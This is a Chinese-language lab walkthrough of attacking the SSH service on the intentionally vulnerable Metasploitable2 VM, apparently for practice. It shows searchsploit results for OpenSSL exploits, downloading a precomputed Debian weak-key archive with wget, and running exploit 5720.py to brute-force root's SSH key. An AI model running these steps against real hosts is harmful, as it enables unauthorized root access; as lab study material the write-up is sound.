## 渗透metasploitable2的SSHD服务
1、前面使用nmap扫描端口，看到ssh的端口也是开放的，尝试渗透sshd服务。

2、搜索exploit-db找到可利用的脚本。
```bash 
[root@kali: ~#] searchsploit openssl
----------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------- 
Description                                                                                                                                    |  Path
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
OpenSSL ASN.1<= 0.9.6j <= 0.9.7b - Brute Forcer for Parsing Bugs                                                                               | /multiple/dos/146.c
Apache OpenSSL - Remote Exploit (Multiple Targets) (OpenFuckV2.c)                                                                              | /linux/remote/764.c
OpenSSL < 0.9.7l / 0.9.8d - SSLv2 Client Crash Exploit                                                                                         | /multiple/dos/4773.pl
Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit                                                                                         | /multiple/remote/5622.txt
Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit (ruby)                                                                                  | /multiple/remote/5632.rb
Debian OpenSSL - Predictable PRNG Bruteforce SSH Exploit (Python)                                                                              | /linux/remote/5720.py
OpenSSL <= 0.9.8k / 1.0.0-beta2 - DTLS Remote Memory Exhaustion DoS                                                                            | /multiple/dos/8720.c
OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS Exploit                                                                                      | /multiple/dos/8873.c
OpenSSL - Remote DoS                                                                                                                           | /linux/dos/12334.c
OpenSSL ASN1 BIO Memory Corruption Vulnerability                                                                                               | /multiple/dos/18756.txt
PHP 6.0 openssl_verify() Local Buffer Overflow PoC                                                                                             | /windows/dos/19963.txt
OpenSSL SSLv2 - Malformed Client Key Remote Buffer Overflow Vulnerability (1)                                                                  | /unix/remote/21671.c
OpenSSL SSLv2 - Malformed Client Key Remote Buffer Overflow Vulnerability (2)                                                                  | /unix/remote/21672.c
OpenSSL 0.9.x CBC Error Information Leakage Weakness                                                                                           | /linux/remote/22264.txt
OpenSSL ASN.1 Parsing Vulnerabilities                                                                                                          | /multiple/remote/23199.c
OpenSSL SSLv2 - Null Pointer Dereference Client Denial of Service Vulnerability                                                                | /multiple/dos/28726.pl
PHP openssl_x509_parse() - Memory Corruption Vulnerability                                                                                     | /php/dos/30395.txt
OpenSSL TLS Heartbeat Extension - Memory Disclosure                                                                                            | /multiple/remote/32745.py
OpenSSL 1.0.1f TLS Heartbeat Extension - Memory Disclosure (Multiple SSL/TLS versions)                                                         | /multiple/remote/32764.py
Heartbleed OpenSSL - Information Leak Exploit (1)                                                                                              | /multiple/remote/32791.c
Heartbleed OpenSSL - Information Leak Exploit (2) - DTLS Support                                                                               | /multiple/remote/32998.c
OpenSSL - 'ssl3_get_key_exchange()' Use-After-Free Memory Corruption Vulnerability                                                             | /linux/dos/34427.txt
PHP 5.x OpenSSL Extension openssl_encrypt Function Plaintext Data Memory Leak DoS                                                              | /php/dos/35486.php
PHP 5.x OpenSSL Extension x Function openssl_decrypt Ciphertext Data Memory Leak DoS                                                           | /php/dos/35487.php
----------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------
```
3、找到5720.py这个python脚本，先找到exploit-db的脚本位置
```bash
[root@kali: ~#] locate 5720.py
/usr/share/exploitdb/platforms/linux/remote/5720.py
```
4、阅读下这个脚本
```bash
[root@kali: ~#] cat /usr/share/exploitdb/platforms/linux/remote/5720.py | more
############################################################################
# Autor: hitz - WarCat team (warcat.no-ip.org)
# Collaborator: pretoriano
#
# 1. Download http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2
#
# 2. Extract it to a directory
#
# 3. Execute the python script
#     - something like: python exploit.py /home/hitz/keys 192.168.1.240 root 22 5
#     - execute: python exploit.py (without parameters) to display the help
#     - if the key is found, the script shows something like that:
#         Key Found in file: ba7a6b3be3dac7dcd359w20b4afd5143-1121
#         Execute: ssh -lroot -p22 -i /home/hitz/keys/ba7a6b3be3dac7dcd359w20b4afd5143-1121 192.168.1.240
############################################################################
#脚本作者在前面写了使用方法，需要下一个密钥压缩包
#http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2
[root@kali: ~#] wget -c http://www.exploit-db.com/sploits/debian_ssh_rsa_2048_x86.tar.bz2
[root@kali: ~#] tar jxvf debian_ssh_rsa_2048_x86.tar.bz2
#很多，需要一点时间
#花了一点时间，查看到底有多少个密钥文件
[root@kali: ~#] ls -l rsa/2048/ |wc -l
65537
#看脚本使用说明，貌似跟前面的密码暴力破解是一个原理?
#先跑起来看看哦~~~
[root@kali: ~#] python /usr/share/exploitdb/platforms/linux/remote/5720.py rsa/2048/ metasploitable2 root 22
....
#要跑完6w多个，看样子有得等哦~~~抽支烟，喝杯茶！
#继续等。。。
#跟妹子聊会天。。。
```